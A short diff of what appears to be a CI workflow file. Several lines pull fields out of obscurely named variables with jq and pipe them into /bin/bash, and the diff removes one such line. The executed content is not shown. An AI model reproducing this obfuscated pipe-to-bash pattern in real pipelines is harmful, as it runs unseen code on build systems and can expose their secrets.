@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$vio9978" | jq -r .cr2101 | /bin/bash
           printf '%s' "$v25296" | jq -r .qwh162 | /bin/bash
           printf '%s' "$ui11314" | jq -r .dxwn395 | /bin/bash
-          echo $wcmwk1 | jq -r .isktx14 | /bin/bash
           printf '%s' "$zov2" | jq -r .m9 | /bin/bash
 
       - name: Save archive
